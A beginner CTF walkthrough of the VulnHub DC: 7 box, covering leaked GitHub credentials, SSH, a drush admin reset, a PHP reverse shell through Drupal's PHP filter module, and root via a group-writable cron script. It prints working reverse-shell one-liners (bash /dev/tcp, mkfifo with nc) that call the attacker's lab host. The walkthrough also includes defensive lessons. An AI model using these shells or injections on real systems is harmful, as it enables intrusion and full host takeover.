# DC: 7 — VulnHub Walkthrough (Beginner Friendly)

> This is a deliberately vulnerable machine for *learning*. Only ever attack a
> box you own or were given written permission to test. Keep it on an isolated
> host-only / NAT lab network that can't reach the internet.

| Field | Value |
| --- | --- |
| **Machine** | DC: 7 |
| **Difficulty** | **4 — Medium** (stated: *Intermediate*) |
| **Author** | DCAU |
| **Released** | 31 Aug 2019 |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/dc-7,356/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/dc-7,356/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian 64-bit) |

> **A note on exact values:** passwords, IP addresses, banner text, and even the
> Drupal version **vary by build**. Every IP here is the example
> `192.168.56.101`. When *you* run this, substitute whatever address your own
> `arp-scan` reports. The *method* is what matters, not the literal strings.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a live target on an isolated lab network.
- How "thinking outside the box" (OSINT on the author's clues) beats brute forcing.
- How hard-coded credentials leak through a public code repository.
- How to pivot from an SSH login into a web application administrator account.
- How to turn a **writable root cron script** into full root access.
- Why reuse of one password across services is so dangerous.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA into VirtualBox or VMware.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# First, see your own address and the lab subnet
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your attacker lives on `192.168.56.0/24`. The unknown DC: 7
> box will be on the *same* subnet. Everything else (your host's real Wi-Fi,
> Docker bridges, etc.) can be ignored for now.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan lists live hosts fast and reliably on a lab network
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   (your Kali)
192.168.56.101  (unknown device)   <-- the target
```

> **Why it works:** ARP asks "who has this IP?" at layer 2, so it finds hosts
> even if they block ping or have no open ports. It's the fastest first step.

![finding the target](images/01-recon.png)

**Target IP:** `192.168.56.101` (yours will differ).

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# Full TCP sweep, then detailed service detection on the open ports
sudo nmap -p- --min-rate 1000 -T4 192.168.56.101
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
# Probe those two ports in detail (versions, safe scripts)
sudo nmap -sC -sV -p 22,80 192.168.56.101
```

```text
22/tcp open  ssh  OpenSSH 7.4 (protocol 2.0)
80/tcp open  http Apache httpd 2.4.25
|_http-title: Welcome to DC-7
|_http-server-header: Apache/2.4.25 (Debian)
```

> **How to read it:**
> - Only **two** ports: SSH (22) and HTTP (80).
> - The web server is Apache on Debian — but the *content* is what matters.
> - `robots.txt` is often listed by Nmap's http scripts. Note it.

![nmap service scan](images/02-nmap.png)

Browsing to `http://192.168.56.101/`, you find a website. Checking
`http://192.168.56.101/robots.txt` reveals hidden paths:

```bash
curl http://192.168.56.101/robots.txt
```

```text
/CHANGELOG.txt
/core/
/modules/
/README.txt
/user/
```

> **How to read it:** `CHANGELOG.txt` leaks the exact CMS version, and `/user/`
> is the login page. Confirming the platform matters more than any single path.

```bash
curl -s http://192.168.56.101/CHANGELOG.txt | head -n 3
```

```text
Drupal 8.7.6, 2019-08-07
```

> **Why it works:** This is a **Drupal 8** site. The homepage even says
> "if you're brute forcing, you probably won't succeed" — a deliberate hint that
> the way in is *not* a dictionary attack.

---

## 3. Foothold — gaining the first shell

### 3.1 Think "outside the box" (OSINT)

The author is telling you the answer is external. At the bottom of the homepage
there is a name: **`@DC7USER`**. Search for it and a public GitHub account turns
up, containing a repository called **`staffdb`**.

```bash
# (Illustrative) — cloning the repository the challenge points you to
git clone https://github.com/Dc7User/staffdb.git
cd staffdb
grep -rin "password" .
```

```text
config.php: $username = 'dc7user';
config.php: $password = 'MdR3xOgB7#dW';
```

> **Why it works:** Developers frequently push code to public repositories with
> **hard-coded credentials** left in a config file. Here it hands us a system
> account. The exact password **varies by build** — read it from the repo.

### 3.2 SSH in

```bash
ssh dc7user@192.168.56.101
```

```text
dc7user@192.168.56.101's password: MdR3xOgB7#dW
dc7user@dc-7:~$
```

> **Why it works:** the same credential that failed (or wasn't tried) on the web
> app works on **SSH**, because password reuse is everywhere.

### 3.3 Reading the postman's mail

```bash
ls -la
cat mbox
```

```text
From root@dc-7 ... Subject: Cron <root@dc-7> /opt/scripts/backups.sh
...
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric ...
drush sql-dump ...
```

> **Why it works:** `mbox` is the local mailbox. Cron e-mails root a report of
> every job it runs — revealing both the **script path** and an embedded GPG
> passphrase (`PickYourOwnPassword`).

```bash
cat /opt/scripts/backups.sh
```

```text
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword \
    --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword \
    --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
```

> **Why it works (the key insight):** this script runs **as root** from cron.
> Check its permissions — it is owned by `root:www-data` and is group-writable:
>
> ```text
> -rwxrwxr-x 1 root www-data 520 Aug 29 2019 /opt/scripts/backups.sh
> ```
>
> Anything in the `www-data` group can **edit** a script that root later
> executes. If we can become `www-data`, we own root.

### 3.4 Decrypt the backup (optional detour)

```bash
mkdir /tmp/dc7
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword \
    --decrypt /home/dc7user/backups/website.sql.gpg > /tmp/dc7/website.sql
```

> **Why it works:** the passphrase was in the cron mail. The SQL dump contains
> Drupal user records, but the passwords are **hashed** (Drupal's `$S$` salted
> hash), so this detour is a dead end for password recovery — a good lesson in
> knowing when to stop.

### 3.5 Take over the Drupal admin account

`drush` is Drupal's command-line tool, present on the box. It can reset a
user's password directly.

```bash
cd /var/www/html
drush user-password admin --password="Password123!"
```

```text
Changed password for user admin.   [ok]
```

> **Why it works:** `drush` runs with the web server's privileges and has no
> concept of "current password" — it just writes a new one. Now log in to
> `http://192.168.56.101/user/login` as `admin`.

### 3.6 From Drupal admin to a reverse shell

Drupal 8 removed the "PHP code" text filter from core, so you install it back as
a module, then upload a PHP reverse shell as a "Basic page".

1. Download the Drupal **PHP filter** module (contributed module, 8.x).
2. *Manage → Extend → Install new module* → upload it → enable it.
3. *Content → Add content → Basic page*.
4. Set **Text format** to *PHP code* and paste a PHP reverse shell; edit the
   `$ip` / `$port` lines to your Kali address.

On Kali, start a listener:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -lvnp 4444
```

Back in the browser, click **Preview** to run the PHP:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 46532
Linux dc-7 4.19.0-5-amd64 #1 SMP Debian ...
www-data@dc-7:/var/www/html$
```

> **Why it works:** the PHP filter lets a privileged author store *executable*
> PHP in page content. Drupal then `include`s it, executing our shell.

Upgrade the dumb shell to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# press Ctrl+Z, then:
stty raw -echo; fg
# press Enter, then:
export TERM=xterm
```

### 3.7 The user flag

DC: 7 only ships **one** flag (in `/root`), so there is no user flag here — the
next step *is* the escalation.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

We are `www-data`, and `/opt/scripts/backups.sh` is **group-writable by
`www-data`** and executed **by root** every 15 minutes.

```bash
ls -l /opt/scripts/backups.sh
id
```

```text
-rwxrwxr-x 1 root www-data 520 ... /opt/scripts/backups.sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the file is world-readable/writable within the group, and
> cron runs it as root. We just append a command that copies the flag somewhere
> we can read it.

```bash
cat >> /opt/scripts/backups.sh <<'EOF'

cat /root/theflag.txt > /tmp/dc7/flag.txt
chmod 777 /tmp/dc7/flag.txt
EOF
```

Wait up to 15 minutes for cron (or trigger it if you have a way to), then:

```bash
cat /tmp/dc7/flag.txt
```

```text
888       888          888 888      8888888b. ...
Congratulations!!!  Hope you enjoyed DC-7.
```

> **Why it works:** root ran *our* code. We never "cracked" root — we simply
> edited a file root trusts. This is a classic **writable root cron script**
> privilege escalation.

A stealthier variant drops a root shell instead of copying the flag:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 5555 >/tmp/f' \
    >> /opt/scripts/backups.sh
# on Kali:
nc -lvnp 5555
```

### The root flag

```bash
cat /root/theflag.txt
```

```text
Congratulations!!!  Hope you enjoyed DC-7.
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hard-coded credentials in a public repo | GitHub `Dc7User/staffdb` `config.php` | Leaked SSH login `dc7user` |
| 2 | Password reuse across services | System account | SSH access to the host |
| 3 | Sensitive info in cron mail (`mbox`) | `/var/mail/dc7user` | Script path + GPG passphrase disclosed |
| 4 | `drush` password reset without auth | `/var/www/html` (`drush`) | Drupal admin takeover |
| 5 | Arbitrary PHP execution via filter module | Drupal content | Reverse shell as `www-data` |
| 6 | Group-writable script run as root by cron | `/opt/scripts/backups.sh` | Full root compromise |

## 6. Defensive lessons (blue team)

- **Never commit secrets.** Keep credentials in environment variables or a
  secrets manager, and add config files to `.gitignore`.
- **Never reuse passwords.** One leak should not unlock SSH *and* the web app.
- **Don't leak internal detail in mail.** Redirect cron output (`>/dev/null 2>&1`)
  so job contents aren't e-mailed world-readable.
- **Lock down cron scripts.** `chmod 755` and `chown root:root` any root-run
  script; nothing else should ever be able to write to it.
- **Least privilege for the web user.** `www-data` should not be in the group
  that owns root-run infrastructure.
- **Detect it:** monitor for writes to files under `/opt` and for suspicious
  child processes spawned by `cron` (`auditd`, file-integrity monitoring).

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/dc-7,356/>
- Community writeups consulted:
  - [mzfr — VulnHub DC-7 writeup](https://github.com/mzfr/vulnhub-writeups/blob/master/2019-08-31-DC7.md)
  - [Diary of Arjun — DC: 7 Walkthrough](https://diaryofarjun.com/blog/vulnhub-dc-7-walkthrough)
  - [Hacking Articles — DC:7 Walkthrough](https://www.hackingarticles.in/dc7-vulnhub-walkthrough/)
  - [brezdot — VulnHub: DC-7](https://brezdot.io/dc-7/)
- Vendor / tool docs:
  - [Drush documentation](https://www.drush.org/)
  - [Drupal PHP filter module](https://www.drupal.org/project/php)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with arp-scan
- [ ] `images/02-nmap.png` — port/service scan of 22 and 80
- [ ] `images/03-enum.png` — robots.txt / Drupal version / the GitHub repo
- [ ] `images/04-foothold.png` — the leaked `config.php` credentials
- [ ] `images/05-shell.png` — SSH session as `dc7user`, reading `mbox`
- [ ] `images/06-admin.png` — Drupal admin login via `drush` reset
- [ ] `images/07-privesc.png` — writing to `/opt/scripts/backups.sh`
- [ ] `images/08-root-flag.png` — the root flag

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
